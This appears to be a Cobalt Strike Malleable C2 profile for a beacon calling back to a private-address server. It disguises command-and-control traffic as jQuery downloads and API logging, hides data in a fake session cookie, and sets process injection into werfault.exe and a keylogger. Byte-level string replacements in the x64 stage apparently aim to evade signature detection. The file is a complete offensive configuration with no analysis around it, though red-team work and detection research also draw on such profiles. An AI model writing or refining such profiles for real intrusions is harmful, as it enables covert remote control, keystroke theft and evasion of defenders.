set sleeptime "15000";
set jitter    "20";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";

set host_stage "true";

http-beacon {
    set library "winhttp";
}

stage {
    set userwx "false";
    set cleanup "true";
    set smartinject "true";
    set stomppe "false";
    set obfuscate "false";
    
    transform-x86 {
        strrep "%s as %s\\%s: %d" "%s - %s\\%s: %d";
        strrep "%02d/%02d/%02d %02d:%02d:%02d" "%02d-%02d-%02d %02d:%02d:%02d";
        strrep "%s (admin)" "%s [admin]";
        strrep "(null)" "(none)";
        strrep "rijndael" "aes-256";
        strrep "HTTP/1.1 200 OK" "HTTP/1.1 200 Ok";
        strrep "Content-Type: application/octet-stream" "Content-Type: application/data-stream";
    }
    
    transform-x64 {
        strrep "\x48\x89\x5c\x24\x08\x57\x48\x83\xec\x20\x48\x8b\x59\x10\x48\x8b\xf9\x48\x8b\x49\x08\xff\x17\x33\xd2\x41\xb8\x00\x80\x00\x00" "\x57\x48\x89\x5c\x24\x08\x48\x83\xec\x20\x48\x8b\x59\x10\x48\x8b\xf9\x48\x8b\x49\x08\xff\x17\x33\xd2\x41\xb8\x00\x80\x00\x00";
        strrep "\xbd\x08\x00\x00\x00\x85\xd2\x74\x59\xff\xcf\x4d\x85\xed" "\x85\xd2\x74\x59\xbd\x08\x00\x00\x00\xff\xcf\x4d\x85\xed";
        strrep "%s as %s\\%s: %d" "%s - %s\\%s: %d";
        strrep "%02d/%02d/%02d %02d:%02d:%02d" "%02d-%02d-%02d %02d:%02d:%02d";
        strrep "%s (admin)" "%s [admin]";
        strrep "(null)" "(none)";
        strrep "rijndael" "aes-256";
        strrep "HTTP/1.1 200 OK" "HTTP/1.1 200 Ok";
        strrep "Content-Type: application/octet-stream" "Content-Type: application/data-stream";
    }
}

process-inject {
    set allocator "NtMapViewOfSection";
    set min_alloc "24576";
    set userwx    "false";
    set startrwx  "false";
    
    execute {
        CreateThread;
        CreateRemoteThread;
        NtQueueApcThread-s;
        RtlCreateUserThread;
    }
}

post-ex {
    set spawnto_x86 "%windir%\\syswow64\\werfault.exe";
    set spawnto_x64 "%windir%\\sysnative\\werfault.exe";
    
    set obfuscate "false";
    set smartinject "true";
    set amsi_disable "false";
    set keylogger "GetAsyncKeyState";
}

http-get {
    set uri "/static/jquery.min.js /cdn/jquery-3.6.0.js";
    
    client {
        header "Accept" "text/javascript, application/javascript, */*";
        header "Accept-Language" "en-US,en;q=0.9";
        header "Accept-Encoding" "gzip, deflate";
        header "Referer" "https://www.example.com/";
        header "Cache-Control" "no-cache";
        header "Host" "192.168.127.153";
        
        metadata {
            base64url;
            prepend "PHPSESSID=";
            header "Cookie";
        }
    }
    
    server {
        header "Server" "nginx/1.18.0";
        header "Content-Type" "application/javascript; charset=utf-8";
        header "Cache-Control" "public, max-age=31536000";
        header "X-Content-Type-Options" "nosniff";
        
        output {
            base64;
            print;
        }
    }
}

http-post {
    set uri "/api/log /api/event";
    set verb "POST";
    
    client {
        header "Content-Type" "application/x-www-form-urlencoded";
        header "Host" "192.168.127.153";
        
        id {
            base64url;
            parameter "uid";
        }
        
        output {
            base64url;
            parameter "data";
        }
    }
    
    server {
        header "Server" "nginx/1.18.0";
        header "Content-Type" "text/plain";
        
        output {
            base64;
            print;
        }
    }
}

http-stager {
    set uri_x86 "/static/app.js";
    set uri_x64 "/static/bundle.js";
    
    client {
        header "Accept" "text/javascript, */*";
        header "Host" "192.168.127.153";
    }
    
    server {
        header "Server" "nginx/1.18.0";
        header "Content-Type" "application/javascript";
        
        output {
            print;
        }
    }
}

https-certificate {
    set CN       "192.168.127.153";
    set O        "Example Corporation";
    set C        "US";
    set L        "Boston";
    set OU       "IT";
    set ST       "MA";
    set validity "365";
}

